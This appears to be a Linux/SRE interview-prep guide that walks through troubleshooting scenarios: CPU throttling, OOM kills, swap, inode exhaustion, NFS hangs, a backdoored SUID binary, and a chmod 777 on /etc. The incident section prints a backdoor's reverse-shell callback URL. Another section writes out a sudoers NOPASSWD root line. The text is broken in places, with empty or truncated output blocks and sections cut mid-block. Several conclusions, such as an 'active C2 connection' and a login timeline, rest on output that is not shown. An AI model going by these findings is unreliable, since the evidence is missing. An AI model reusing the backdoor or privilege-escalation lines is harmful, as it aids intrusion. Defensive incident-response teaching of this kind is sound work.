> **Translation:** `cpu.cfs_quota_us=50000` out of `cpu.cfs_period_us=100000` = 500m CPU (0.5 cores). The container can only use 50ms of CPU per 100ms window. If the Go runtime (especially GC) needs 60ms in that window, it gets paused for 10ms — causing request latency spikes.

**Step 3: Observe in real time with watch**

```bash
watch -n 1 'cat /sys/fs/cgroup/cpu/kubepods/burstable/pod8a9b0c1d2e3f/a8b3c1d2e4f5/cpu.stat'
```

```
nr_periods 143891
nr_throttled 98701
throttled_time 234891234567

# 1 second later:
nr_periods 143902
nr_throttled 98709
throttled_time 234903456789
```

> In 1 second: 11 new periods, 8 new throttle events. The throttling is actively happening right now.

**Step 4: Correlate with Go runtime metrics (if exposed)**

```bash
# Check Go runtime metrics endpoint if available
curl -s http://pod-ip:8080/metrics | grep -E "go_gc|go_goroutine|process_cpu"
```

```
go_gc_duration_seconds{quantile="0.5"} 0.012341
go_gc_duration_seconds{quantile="0.9"} 0.081234
go_gc_duration_seconds{quantile="0.99"} 0.189234
go_goroutines 4823
process_cpu_seconds_total 1823.45
```

> **p99 GC pause is 189ms.** When GC runs and exhausts the CFS quota, it must wait for the next period — adding up to 100ms of scheduler-induced latency on top of the GC pause.

**Fix:**

```yaml
# In pod spec — increase CPU limit or remove it entirely (controversial but valid for bursty workloads)
resources:
  requests:
    cpu: "500m"      # Keep request for scheduling
  limits:
    cpu: "2000m"     # Raise limit to allow bursts, OR remove limit entirely
    memory: "512Mi"  # Keep memory limit for OOM protection
```

**Interview insight:**
- CPU `requests` affect scheduling (which node the pod lands on)
- CPU `limits` translate to CFS quota — they can cause throttling even when the node has spare CPU
- Setting CPU limits = `requests` is often recommended for predictable latency (Guaranteed QoS class)
- For latency-sensitive Go or Java apps, consider removing CPU limits and using Vertical Pod Autoscaler (VPA) to right-size requests
- Monitor `container_cpu_cfs_throttled_seconds_total` in Prometheus to catch this proactively

## 3. Memory Management

---

### Q: A production host running multiple containers starts experiencing random OOM kills. You need to understand which process was killed, why, and how to prevent recurrence.

**Answer:**

**Situation:** At 3am, a Grafana alert fires: `NodeMemoryPressure`. Two pods restarted unexpectedly. You check the node.

**Step 1: Read kernel OOM kill history**

```bash
# Check kernel ring buffer for OOM messages
dmesg -T | grep -i "oom\|killed process\|out of memory" | tail -30
```

```
[Wed Jan 15 03:12:34 2024] oom-kill:constraint=CONSTRAINT_MEMCG,nodemask=(null),cpuset=kubepods,mems_allowed=0,oom_memcg=/kubepods/burstable/podabc123/containerdef456,task_memcg=/kubepods/burstable/podabc123/containerdef456,task=java,pid=18234,uid=0

```

> **Key fields:**
> - `constraint=CONSTRAINT_MEMCG` — killed by **cgroup memory limit**, NOT system-wide OOM
> - `oom_score_adj:998` and `1000` — Kubernetes sets this high for burstable/best-effort pods so they die first
> - The java process used 2 GiB anon RSS (actual RAM pages) before being killed
> - Both kills happened within 1 second — cascading OOM event

**Step 2: Check current memory state**

```bash
free -h
```

```
              total        used        free      shared  buff/cache   available
Mem:            15G         14G        128M        234M        1.1G        712M
Swap:            0B          0B          0B
```

```bash
# More detailed view
cat /proc/meminfo | head -30
```

```

SReclaimable:     131072 kB
SUnreclaim:       196608 kB
```

> **Interpretation:**
> - `MemAvailable: 729344 kB` (~712 MiB) — this is what the kernel estimates is available for new allocations
> - `Active(anon): 11534336 kB` — 11 GiB of anonymous memory (heap, stack) actively in use
> - `SwapTotal: 0` — **No swap** configured (common in containers/EKS). Without swap, when limits are hit, OOM kill is immediate

**Step 3: Identify current memory consumers**

```bash
# Sort processes by RSS (Resident Set Size = actual RAM used)
ps aux --sort=-%mem | head -15
```

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root     19234 12.3 22.1 9823456 3621888 ?     S    03:13   8:12 java -jar payment-service.jar
elastic  19401  8.4 18.2 8234512 2981376 ?     S    03:13   4:21 java -server -Xmx4g
root     19512  4.1  9.3 3123456 1523712 ?     S    03:13   2:11 node /app/server.js
postgres 19201  2.1  6.2 1842344 1015808 ?     S    03:13   1:44 postgres: shared_memory
```

**Step 4: Understand OOM scoring — why certain processes get killed**

```bash
# Check oom_score for each major process (higher = more likely to be killed)
for pid in 19234 19401 19512 19201; do
    comm=$(cat /proc/$pid/comm)
    score=$(cat /proc/$pid/oom_score)
    adj=$(cat /proc/$pid/oom_score_adj)
    rss=$(awk '/VmRSS/{print $2}' /proc/$pid/status)
    echo "PID=$pid COMM=$comm OOM_SCORE=$score OOM_ADJ=$adj RSS_KB=$rss"
done
```

```
PID=19234 COMM=java OOM_SCORE=856 OOM_ADJ=998 RSS_KB=3621888
PID=19401 COMM=java OOM_SCORE=712 OOM_ADJ=1000 RSS_KB=2981376
PID=19512 COMM=node OOM_SCORE=623 OOM_ADJ=1000 RSS_KB=1523712
PID=19201 COMM=postgres OOM_SCORE=421 OOM_ADJ=998 RSS_KB=1015808
```

> **Kubernetes sets `oom_score_adj` based on QoS class:**
> - Guaranteed pods: `oom_score_adj = -997` (protected — almost never killed by OOM killer)
> - Burstable pods: `oom_score_adj = min(max(2, 1000 - 10 * (requests/limits)), 999)`
> - BestEffort pods: `oom_score_adj = 1000` (killed first)
> - The `oom_score` = memory usage % × `oom_score_adj` factor — highest score gets killed

**Step 5: Identify the leak with smaps**

```bash
# Detailed memory map for the leaking process
# Check anonymous memory growth over time
cat /proc/19234/status | grep -E "VmRSS|VmPeak|VmSize|RssAnon|RssFile"
```

```
VmPeak:  9823456 kB
VmSize:  9823456 kB
VmRSS:   3621888 kB
RssAnon: 3567616 kB    # <-- 3.4 GiB is anonymous (heap) memory
RssFile:   54272 kB    # <-- Only 53 MiB is file-backed memory
```

```bash
# Watch memory growth over 30 seconds
for i in $(seq 1 6); do
    rss=$(awk '/VmRSS/{print $2}' /proc/19234/status)
    echo "$(date +%H:%M:%S) RSS: $((rss/1024)) MiB"
    sleep 5
done
```

```
03:15:01 RSS: 3538 MiB
03:15:06 RSS: 3572 MiB
03:15:11 RSS: 3609 MiB
03:15:16 RSS: 3645 MiB
03:15:21 RSS: 3681 MiB
03:15:26 RSS: 3718 MiB
```

> **Growing ~36 MiB every 5 seconds = ~432 MiB/minute** — active memory leak confirmed.

**Prevention:**

```yaml
# Set memory limits AND requests in pod spec
resources:
  requests:
    memory: "2Gi"   # Reserve this much on the node
  limits:
    memory: "3Gi"   # Kill container if it exceeds this

# For Java services: align JVM heap with container limit
env:
- name: JAVA_OPTS
  value: "-Xms1g -Xmx2g -XX:+UseContainerSupport -XX:MaxRAMPercentage=75.0"
# -XX:+UseContainerSupport: JVM reads cgroup limits instead of host total RAM
# Without this, JVM may set heap to 25% of HOST RAM (e.g., 4 GiB on 16 GiB node)
```

### Q: A production host has enough free RAM but processes are being swapped out causing high latency. How do you diagnose and tune swappiness?

**Answer:**

**Situation:** An API service reports intermittent latency spikes every few hours. The node has 4 GiB free RAM but `vmstat` shows swap activity.

**Step 1: Check swap usage and activity**

```bash
swapon --show
```

```
NAME      TYPE  SIZE  USED PRIO
/dev/sdb1 partition 8G  3.2G   -2
```

```bash
vmstat 1 10
```

```
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 2  0 3276800 4194304 131072 2097152  412  234  823  1234 2341 4512 42  8 48  2  0
 3  0 3276800 4161536 131072 2097152  523  178  934  1123 2412 4623 44  7 47  2  0
 1  0 3276800 4128768 131072 2097152  489  256  812  1045 2389 4534 41  8 49  2  0
```

> **`si` (swap in) = 412-523 KB/s** — processes are being swapped IN from disk. This means they were previously swapped out and are being accessed again. Even with 4 GiB free, the kernel is swapping!

**Step 2: Check swappiness**

```bash
cat /proc/sys/vm/swappiness
```

```
60
```

> **Default swappiness is 60.** This means the kernel will begin swapping out memory when it can "benefit" from doing so — it aggressively uses swap even when RAM is available, treating swap as a cache extension.

**Step 3: Identify what's swapped**

```bash
# Check per-process swap usage
for pid in $(ps aux | awk 'NR>1 {print $2}' | head -20); do
    swap=$(awk '/VmSwap/{print $2}' /proc/$pid/status 2>/dev/null)
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    [ "${swap:-0}" -gt "10240" ] && echo "PID=$pid COMM=$comm SWAP_KB=$swap"
done
```

```
PID=8234  COMM=java   SWAP_KB=1572864
PID=8891  COMM=redis-server SWAP_KB=524288
PID=9012  COMM=node   SWAP_KB=262144
```

> **Redis has 512 MiB in swap!** Redis is an in-memory database — if its data pages get swapped to disk, any access causes a disk read (microseconds → milliseconds). This is catastrophic for latency.

**Step 4: Fix swappiness**

```bash
# Immediate fix (runtime, reset on reboot)
sysctl -w vm.swappiness=10

# For EKS nodes / containers: set to 1 (nearly disable swap)
sysctl -w vm.swappiness=1

# Permanent fix
echo 'vm.swappiness=1' >> /etc/sysctl.d/99-sre.conf
sysctl -p /etc/sysctl.d/99-sre.conf
```

```bash
# Reclaim swap pages for Redis (force page-in, may cause spike)
cat /proc/8891/smaps | grep Swap | awk '{sum+=$2} END {print sum/1024 " MiB"}'
```

```
512.0 MiB
```

```bash
# Force the kernel to reclaim swap for this process
# WARNING: This will cause a brief I/O spike as pages are read from disk
echo 1 > /proc/sys/vm/drop_caches  # Drop page cache (NOT swap pages)

# To actually force swap reclaim, you need to cycle swapoff/swapon
swapoff -a && swapon -a  # CAUTION: This locks the system briefly — do during maintenance window
```

**Interview insight:**
- `vm.swappiness=0` does NOT mean "never swap" — it means only swap when absolutely necessary (RAM exhausted)
- `vm.swappiness=1` is the Kubernetes-recommended value for worker nodes (many guides set this in node bootstrap)
- For Redis, ElasticSearch, and other in-memory systems: disable swap entirely or use `mlock` in the app
- In EKS: configure node bootstrap to set `vm.swappiness=1` via `nodeadm` or launch template user data

## 4. Disk & Filesystem

---

### Q: A production host reports "No space left on device" but `df -h` shows 40% disk used. How do you diagnose and fix this?

**Answer:**

**Situation:** A log aggregation service on a node starts throwing `write: no space left on device`. Engineers check `df -h` and see `40%` used. The service team is panicking.

**Step 1: Check disk usage carefully**

```bash
df -h
```

```
Filesystem      Size  Used Avail Use% Mounted on
/dev/nvme0n1p1   50G   20G   30G  40% /
tmpfs           7.9G  234M  7.7G   3% /dev/shm
/dev/nvme0n2     20G   19G  1.0G  95% /var/log
```

> **Found it immediately on closer inspection:** `/var/log` is 95% full! The service writes logs to `/var/log` which is a separate mount. `df -h` output requires reading ALL lines — not just the first one.

**But what if `df -h` truly shows only 40% on the correct mount?**

```bash
# Check inode usage — files can exhaust inodes even with space available
df -i
```

```
Filesystem      Inodes  IUsed   IFree IUse% Mounted on
/dev/nvme0n1p1 3276800 3276799       1  100% /
tmpfs          2045952      42 2045910    1% /dev/shm
/dev/nvme0n2   1310720  489234  821486   37% /var/log
```

> **INODE EXHAUSTION!** `/dev/nvme0n1p1` has 0 free inodes — every inode is used. You cannot create new files even though 30 GiB of space remains. Each file, directory, and symlink consumes one inode.

**Step 2: Find what's consuming all inodes**

```bash
# Find directories with the most files (inode consumers)
for dir in /tmp /run /var/spool /var/lib; do
    count=$(find $dir -maxdepth 3 2>/dev/null | wc -l)
    echo "$count $dir"
done | sort -rn | head -10
```

```
2847234 /tmp
128341  /var/lib
34512   /var/spool
18923   /run
```

```bash
# Drill into /tmp
find /tmp -maxdepth 2 -type d | while read d; do
    count=$(ls -la "$d" 2>/dev/null | wc -l)
    echo "$count $d"
done | sort -rn | head -10
```

```
891234 /tmp/ruby_sess
542123 /tmp/php_sessions
234512 /tmp/app_tmp
```

```bash
# Count files in the worst offender
ls /tmp/ruby_sess | wc -l
```

```
891234
```

> **891,234 session files in `/tmp/ruby_sess`!** A Ruby application is creating session files and not cleaning them up. Session files accumulate indefinitely.

**Step 3: Check age distribution of these files**

```bash
# Files older than 7 days
find /tmp/ruby_sess -mtime +7 | wc -l
```

```
888921
```

```bash
# Safely delete old session files — do it in batches to avoid argument list too long
find /tmp/ruby_sess -mtime +7 -delete

# Verify recovery
df -i /
```

```
Filesystem      Inodes  IUsed   IFree IUse% Mounted on
/dev/nvme0n1p1 3276800  388123 2888677   12% /
```

> **Recovered 2.8M inodes.** Service can write files again.

**Step 4: Find and fix large files too (complementary check)**

```bash
# Find the 20 largest files on the filesystem
find / -xdev -type f -printf '%s %p\n' 2>/dev/null | sort -rn | head -20
```

```
52428800000 /var/log/app/access.log

7516192768  /var/lib/docker/containers/def456/def456-json.log
```

> **`/var/log/app/access.log` is 52 GB!** The app doesn't rotate logs. Docker container logs are also growing unbounded.

```bash
# Truncate the log without restarting the process (safe for open file handles)
# DO NOT use `rm` — the process still holds an open file handle
# Truncating sends the file to 0 bytes but the inode stays open
truncate -s 0 /var/log/app/access.log

# For docker container logs — truncate container log
truncate -s 0 /var/lib/docker/containers/abc123/abc123-json.log

# Add logrotate config for permanent fix

### Q: An NFS mount is causing a Kubernetes pod to hang indefinitely on file operations. How do you diagnose and recover without rebooting the node?

**Answer:**

**Situation:** A pod using an NFS PersistentVolume is stuck in `Terminating` state for 45 minutes. Attempts to `kubectl delete pod --force` don't help. The node shows processes in D-state.

**Step 1: Confirm NFS hang on the node**

```bash
# Check for D-state processes on the NFS mount
ps aux | awk '$8 ~ /D/'
```

# Check what syscall the process is stuck in

```
nfs_wait_bit_killable
```

> **Confirmed NFS hang.** The process is blocked in `nfs_wait_bit_killable` — waiting for NFS server to respond. This is a "hard" NFS mount behavior — the client waits indefinitely.

**Step 2: Identify the NFS mount**

```bash
# List NFS mounts
mount | grep nfs
```

```
nfs-server.internal:/exports/data on /var/data type nfs4 (rw,relatime,vers=4.1,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.0.1.45,local_lock=none,addr=10.0.2.100)
```

> **Key:** `hard` mount option means retries are infinite — the process will NEVER return from the NFS call until the server responds. If the NFS server is unreachable, the process is stuck forever.

```bash
# Check if NFS server is reachable
ping -c 3 10.0.2.100
```

```
PING 10.0.2.100 (10.0.2.100) 56(84) bytes of data.
Request timeout for icmp_seq 0
Request timeout for icmp_seq 1
Request timeout for icmp_seq 2
```

```bash
# Try NFS-specific test
showmount -e 10.0.2.100
```

```
clnt_create: RPC: Port mapper failure - Timed out
```

> **NFS server (10.0.2.100) is completely unreachable.** The NFS server has gone down or there's a network partition.

**Step 3: Attempt to unmount (will likely hang too)**

```bash
# Normal umount will hang
# Use lazy unmount to detach immediately
umount -l /var/data   # -l = lazy unmount: detach from filesystem namespace immediately
                       # existing file handles continue to work until closed

# Or force unmount
umount -f /var/data
```

```
umount: /var/data: target is busy.
```

```bash
# Find all processes using the mount
fuser -mv /var/data
```

```
                     USER        PID ACCESS COMMAND
/var/data:           root      23891 ..c.. python3
                     root      23892 ..c.. python3
                     root      23412 F.... nfsd4
```

```bash
# Kill the processes holding the mount
fuser -kv /var/data
# This sends SIGTERM to all processes

# Then try unmount again
umount -l /var/data
```

```
# Lazy unmount succeeded
```

```bash
# Verify
mount | grep /var/data
# No output = unmounted
```

```bash
# The pod should now be killable
kubectl delete pod stuck-pod --grace-period=0 --force
```

**Prevention — mount with `soft` and `timeo`:**

```yaml
# In PersistentVolume spec
apiVersion: v1
kind: PersistentVolume
spec:
  nfs:
    server: nfs-server.internal
    path: /exports/data
  mountOptions:
    - soft          # Return error after timeo*retrans instead of hanging forever
    - timeo=30      # 3-second timeout per retry (timeo is in 0.1s units = 3s)
    - retrans=3     # Retry 3 times = total 9 seconds before ETIMEDOUT
    - intr           # Allow signals to interrupt NFS calls (for kill -9 recovery)
```

> **Trade-off:** `soft` mounts can cause data corruption if a write is interrupted mid-operation. Use `soft` for read-heavy mounts; for write-heavy critical data, use `hard` with proper NFS server HA.

## 5. Permissions & Security

---

### Q: You find a suspicious SUID binary on a production server. How do you investigate it, assess the risk, and determine if it was maliciously placed?

**Answer:**

**Situation:** During a routine security audit, an automated scanner alerts on a non-standard SUID binary at `/usr/local/bin/healthcheck`. SUID binaries run with the owner's privileges (often root) regardless of who executes them — a significant privilege escalation risk if misused.

**Step 1: Find all SUID/SGID binaries on the system**

```bash
# Find all SUID (Set User ID) binaries
find / -perm /4000 -type f 2>/dev/null | sort
```

```
/bin/su
/bin/sudo
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/local/bin/healthcheck    # <-- NOT in standard list
/usr/bin/pkexec
```

```bash
# Compare against known-good list (baseline)
dpkg -S /usr/local/bin/healthcheck  # Check if it belongs to any package
```

```
dpkg-query: no path found matching pattern /usr/local/bin/healthcheck
```

> **Not from any package manager.** This binary was placed manually. That's suspicious.

**Step 2: Investigate the binary**

```bash
# Check file properties
ls -la /usr/local/bin/healthcheck
```

```
-rwsr-xr-x 1 root root 24576 Jan 12 03:47 /usr/local/bin/healthcheck
```

> `rws` — SUID bit is set (`s` in owner execute position). Runs as `root` for any user.

```bash
# Check file type and strings
file /usr/local/bin/healthcheck
```

```
/usr/local/bin/healthcheck: ELF 64-bit LSB executable, x86-64, dynamically linked
```

```bash
# Look at strings inside binary for clues
strings /usr/local/bin/healthcheck | head -40
```

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
execve
system
/bin/bash
/bin/sh
curl
http://192.168.100.200:4444/shell
SHELL=/bin/bash
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

> **CRITICAL FINDING:**
> - Binary calls `setuid`, `execve`, `system` — classic shell execution chain
> - References `/bin/sh` and `/bin/bash`
> - Contains a URL `http://192.168.100.200:4444/shell` — likely a **reverse shell callback**
> - This is almost certainly a **backdoor/rootkit component**

**Step 3: Check when it was placed and who placed it**

```bash
# Check file timestamps
stat /usr/local/bin/healthcheck
```

```
  File: /usr/local/bin/healthcheck
  Size: 24576           Blocks: 48         IO Block: 4096   regular file

```

> **Timeline reconstructed:** Source IP `203.0.113.45` logged in as `deploy` user, escalated to root via sudo, copied binary from `/tmp/hc`, and set SUID bit. This is a **compromised deploy account** being used to install a backdoor.

**Step 4: Check if the backdoor has been triggered**

```bash
# Check network connections to the C2 IP
ss -tnp | grep 192.168.100.200
netstat -tnp | grep 192.168.100.200
```

```

```

> **ACTIVE C2 CONNECTION.** A bash process is connected to the attacker's IP. The system is **actively compromised**.

**Step 5: Incident response**

```bash
# 1. Isolate the node immediately (revoke security group rules from AWS Console)
# 2. Kill the reverse shell
kill -9 29234

# 3. Remove the backdoor
chmod 0755 /usr/local/bin/healthcheck  # Remove SUID first
rm /usr/local/bin/healthcheck

# 4. Lock the compromised account
passwd -l deploy
usermod -L deploy

# 5. Revoke deploy's SSH keys
> /home/deploy/.ssh/authorized_keys

# 6. Preserve evidence for forensics
cp /var/log/auth.log /secure_evidence/
journalctl -u ssh --since "2024-01-12 03:00" > /secure_evidence/ssh_journal.log

# 7. Check for persistence mechanisms
crontab -l -u deploy
ls -la /etc/cron*
cat /etc/rc.local
find / -newer /usr/local/bin/healthcheck -mtime -1 2>/dev/null | grep -v proc
```

### Q: A developer on your team accidentally ran `chmod -R 777 /etc` on a production server. How do you recover, and what are the immediate security implications?

**Answer:**

**Situation:** `chmod -R 777 /etc` was run as root. All files and directories under `/etc` now have world-readable, world-writable, world-executable permissions. This is a critical security incident.

**Step 1: Understand the immediate impact**

```bash
ls -la /etc/shadow  # Should be 640 root:shadow
```

```
-rwxrwxrwx 1 root shadow 1423 Jan 15 09:12 /etc/shadow
```

> **`/etc/shadow` is now world-readable** — any user on the system can read password hashes. This is an immediate credential exposure.

```bash
ls -la /etc/sudoers
```

```
-rwxrwxrwx 1 root root 755 Jan 14 18:23 /etc/sudoers
```

> **`/etc/sudoers` is world-writable** — any user can add `username ALL=(ALL) NOPASSWD:ALL` to grant themselves root. This is full system compromise potential.

**Step 2: Restore correct permissions from a known-good reference**

```bash
# Method 1: Use package manager to restore permissions (Debian/Ubuntu)
dpkg --verify 2>&1 | grep /etc | head -20
```

```
??5?????? c /etc/ssh/sshd_config
??5?????? c /etc/sudo.conf
??5?????? c /etc/shadow
??5?????? c /etc/gshadow
??5?????? c /etc/passwd
??5?????? c /etc/group
```

```bash
# Reinstall the affected packages to restore file permissions
# For critical system files:
dpkg --force-confmiss -i /var/cache/apt/archives/login_*.deb
dpkg --force-confmiss -i /var/cache/apt/archives/passwd_*.deb
dpkg --force-confmiss -i /var/cache/apt/archives/openssh-server_*.deb
dpkg --force-confmiss -i /var/cache/apt/archives/sudo_*.deb
```

```bash
# Method 2: Manually restore critical file permissions
# These are the canonical permissions for critical /etc files:

# Authentication files
chmod 644 /etc/passwd         # World-readable, only root can write
chmod 640 /etc/shadow         # Only root and shadow group can read
chmod 644 /etc/group          # World-readable
chmod 640 /etc/gshadow        # Only root and shadow group

# SSH
chmod 644 /etc/ssh/ssh_config
chmod 600 /etc/ssh/sshd_config
chmod 600 /etc/ssh/ssh_host_*_key   # Private keys — only root reads
chmod 644 /etc/ssh/ssh_host_*_key.pub  # Public keys — world-readable

# Sudo
chmod 440 /etc/sudoers         # Read-only for root and wheel group
chmod 750 /etc/sudoers.d/
chmod 440 /etc/sudoers.d/*

# Cron
chmod 600 /etc/crontab
chmod 700 /etc/cron.d/
chmod 600 /etc/cron.d/*
chmod 700 /etc/cron.daily/
chmod 700 /etc/cron.hourly/

# PAM
chmod 644 /etc/pam.conf
chmod 644 /etc/pam.d/*

# SSL/TLS
chmod 755 /etc/ssl/
chmod 644 /etc/ssl/certs/*
chmod 600 /etc/ssl/private/*    # Private keys
```

```bash
# Method 3: Use a reference container/golden AMI to compare
# On a healthy host:
find /etc -printf '%m %p\n' | sort > /tmp/good_perms.txt

# On the compromised host — compare
find /etc -printf '%m %p\n' | sort > /tmp/bad_perms.txt
diff /tmp/good_perms.txt /tmp/bad_perms.txt | grep '^>' | head -20
```

**Step 3: Verify SSH still works before closing the session**

```bash
# Test SSH config validity before restarting
sshd -t
```

```
/etc/ssh/sshd_config line 14: Bad SSH2 cipher spec 'aes128-cbc'.
```

```bash
# Fix any config issues, then restart
systemctl restart sshd

# DO NOT close your current session until you verify SSH works
# Open a new terminal and test login
ssh -o StrictHostKeyChecking=no user@prod-host "echo SSH working"
```

**Key interview insight:**
- `chmod -R 777 /etc` is recoverable — but requires care and a reference baseline
- The most dangerous immediate exposures: `/etc/shadow` (password hashes), `/etc/sudoers` (privilege escalation), `/etc/cron*` (arbitrary command execution), `/etc/pam.d/` (auth bypass)
- After recovery, **rotate all passwords and review all SSH authorized_keys** — assume all credentials were exposed
- Use `aide` or `tripwire` for file integrity monitoring to detect permission changes
- In AWS/EKS: terminate the instance and replace with a clean AMI — don't try to clean a potentially compromised host

## 6. SSH & Remote Management

---

### Q: SSH connections to a production server are hanging at "debug1: expecting SSH2_MSG_KEX_ECDH_REPLY" for 60 seconds before connecting. How do you diagnose and fix this?

**Answer:**

**Situation:** Engineers report SSH taking 60+ seconds to connect to a specific host. The service is operational and other network connections work fine.

**Step 1: Diagnose with verbose SSH**

```bash
ssh -vvv admin@prod-host-03 2>&1 | head -60
```

```
OpenSSH_8.9p1, OpenSSL 3.0.2
debug1: Reading configuration data /home/admin/.ssh/config
debug1: Connecting to prod-host-03 [10.0.1.45] port 22.
debug1: Connection established.
debug1: identity file /home/admin/.ssh/id_ed25519 type 3
debug3: send packet: type 20          # Key exchange init sent
debug3: receive packet: type 20       # Server responded with KEX init
debug3: send packet: type 30          # ECDH key exchange init
# .... 57 seconds of silence ....
debug3: receive packet: type 31       # Finally got ECDH reply
debug1: SSH2_MSG_NEWKEYS sent
debug1: Authenticated to prod-host-03
```

> **The delay is between sending the ECDH key exchange and receiving the server reply.** This points to the **server-side SSH daemon experiencing slowness during key exchange** — not a network issue (connection was established immediately).

**Step 2: Check sshd on the server side**

```bash
# Via an existing session or out-of-band access
journalctl -u ssh -f &   # Monitor SSH logs in background

# From another terminal, try to connect and watch the logs
```

```
Jan 15 14:23:01 prod-host-03 sshd[29234]: Connection from 10.0.0.100 port 52341
Jan 15 14:23:01 prod-host-03 sshd[29234]: debug1: PAM: initializing for "admin"
Jan 15 14:23:01 prod-host-03 sshd[29234]: debug1: PAM: setting PAM_RHOST to "10.0.0.100"
Jan 15 14:23:01 prod-host-03 sshd[29234]: debug1: PAM: setting PAM_TTY to "ssh"
# 57 seconds pass...
Jan 15 14:24:01 prod-host-03 sshd[29234]: Accepted publickey for admin
Jan 15 14:24:01 prod-host-03 sshd[29234]: pam_unix(sshd:session): session opened
```

> No obvious error. The delay happens during PAM initialization.

**Step 3: Check for DNS reverse lookup issue**

```bash
# Check sshd_config for UseDNS
grep -i "usedns\|GSSAPIAuthentication" /etc/ssh/sshd_config
```

```
UseDNS yes
GSSAPIAuthentication yes
```

> **Both `UseDNS yes` and `GSSAPIAuthentication yes` are problematic:**
> - `UseDNS yes`: sshd does a **reverse DNS lookup** on the connecting IP to validate it. If DNS is slow/unreachable, this blocks
> - `GSSAPIAuthentication yes`: attempts Kerberos GSSAPI auth, making additional DNS/Kerberos lookups

**Step 4: Verify DNS is the culprit**

```bash
# Time a reverse DNS lookup for the SSH client IP
time host 10.0.0.100
```

```
Host 10.0.0.100 not found: 3(NXDOMAIN)

real    0m57.234s   # <-- DNS query took 57 seconds to return NXDOMAIN!
user    0m0.001s
sys     0m0.001s
```

> **Confirmed:** Reverse DNS lookup for `10.0.0.100` takes 57 seconds to timeout and return NXDOMAIN. The DNS resolver is not responding properly for the 10.0.0.0/8 PTR zone.

**Step 5: Fix**

```bash
# Immediate fix in sshd_config
cat >> /etc/ssh/sshd_config << 'EOF'

# Performance fixes
UseDNS no                    # Disable reverse DNS lookup
GSSAPIAuthentication no      # Disable Kerberos/GSSAPI (not used in this environment)
EOF

# Reload sshd (not restart — preserves existing sessions)
systemctl reload sshd

# Verify fix
time ssh admin@prod-host-03 "echo connected"
```

```
connected

real    0m1.234s   # Down from 60s to 1.2s
```

**Additional SSH hardening while we're here:**

```bash
cat > /etc/ssh/sshd_config.d/99-hardening.conf << 'EOF'
# Performance
UseDNS no
GSSAPIAuthentication no
GSSAPICleanupCredentials no

# Security

### Q: You need to set up SSH ProxyJump to access private EKS nodes through a bastion host, and the connection keeps dropping. How do you configure it reliably?

**Answer:**

**Situation:** EKS worker nodes are in private subnets with no direct internet access. You need to SSH into them for debugging, routing through a bastion host in the public subnet.

**Step 1: Basic ProxyJump setup**

```bash
cat ~/.ssh/config
```

```
# Bastion host (in public subnet, reachable from internet)
Host bastion
    HostName 52.66.100.200
    User ec2-user
    IdentityFile ~/.ssh/eks-admin.pem
    ServerAliveInterval 30
    ServerAliveCountMax 3

# EKS worker nodes (private subnet, only reachable from bastion)
Host 10.0.*.*
    User ec2-user
    IdentityFile ~/.ssh/eks-admin.pem
    ProxyJump bastion
    ServerAliveInterval 30
    ServerAliveCountMax 3
    ConnectTimeout 10
```

```bash
# Test connection
ssh 10.0.1.45
```

```
Last login: Mon Jan 15 14:00:01 2024 from 10.0.0.5
[ec2-user@ip-10-0-1-45 ~]$
```

> **ProxyJump** (`-J` flag or `ProxyJump` directive) creates a TCP tunnel through the bastion. SSH traffic is forwarded through the bastion's SSH connection — you only need the key on your local machine.

**Step 2: Diagnose connection drops**

```bash
# Test with verbose to see where drops occur
ssh -v -o 'LogLevel=DEBUG3' 10.0.1.45 "sleep 300" 2>&1 | grep -E "alive|timeout|packet|disconnect"
```

```
debug3: send packet: type 1 (SSH2_MSG_DISCONNECT)
debug1: channel 0: free: direct-tcpip: listening port 0 for 10.0.1.45 port 22, connect from ...
debug1: Connection to 10.0.1.45 closed by remote host.   # <-- Dropped after ~120s
```

> **Server is closing the connection.** AWS Network Load Balancers and NAT Gateways have idle timeout (default 350 seconds). But the real culprit here is often the NLB/security group idle timeout killing quiet SSH sessions.

**Step 3: Configure keep-alives to prevent drops**

```bash
# On the client side (in ~/.ssh/config):
Host 10.0.*.*
    User ec2-user
    IdentityFile ~/.ssh/eks-admin.pem
    ProxyJump bastion
    
    # Keep-alive: send a null packet every 30s, up to 10 failures before dropping
    ServerAliveInterval 30    # Send keepalive every 30 seconds
    ServerAliveCountMax 10    # Allow 10 missed keepalives = 300s tolerance
    
    # TCP keep-alives at OS level too
    TCPKeepAlive yes

# On the server side (/etc/ssh/sshd_config on EKS nodes via SSM or user data):
ClientAliveInterval 30
ClientAliveCountMax 10
```

**Step 4: SSH multiplexing for repeated connections to same node**

```bash
# Multiplexing reuses an existing SSH connection — subsequent ssh/scp/rsync are instant
cat >> ~/.ssh/config << 'EOF'

# Control master for connection multiplexing
Host *
    ControlMaster auto
    ControlPath ~/.ssh/cm-%r@%h:%p
    ControlPersist 10m    # Keep master connection alive for 10 min after last use
EOF

# First connection establishes master
ssh 10.0.1.45 "hostname"

# Second connection reuses it instantly (no key exchange overhead)
time ssh 10.0.1.45 "kubectl get pods"
```

```
real    0m0.189s   # Nearly instant due to multiplexing
```

**Step 5: SCP/rsync through the tunnel**

```bash
# Copy a file to a private EKS node through bastion
scp /tmp/debug-tool.sh 10.0.1.45:/tmp/

# rsync a directory
rsync -avz --progress /local/scripts/ 10.0.1.45:/opt/scripts/

# Both use ProxyJump automatically due to ~/.ssh/config
```

## 7. File Handling & Text Processing

---

### Q: A 50 GB production log file needs to be analyzed for error patterns, and you cannot copy it to another host. How do you efficiently extract insights without loading it into memory?

**Answer:**

**Situation:** A production application generated a 50 GiB log file during an incident. You need to: count unique error types, find the top 10 error messages, and extract entries between 03:00 and 04:00 UTC.

**Step 1: Understand the file without loading it**

```bash
# Check file size and line count efficiently
wc -l /var/log/app/incident-2024-01-15.log
```

```
847234512 /var/log/app/incident-2024-01-15.log
```

```bash
# View first/last lines to understand format
head -5 /var/log/app/incident-2024-01-15.log
```

```
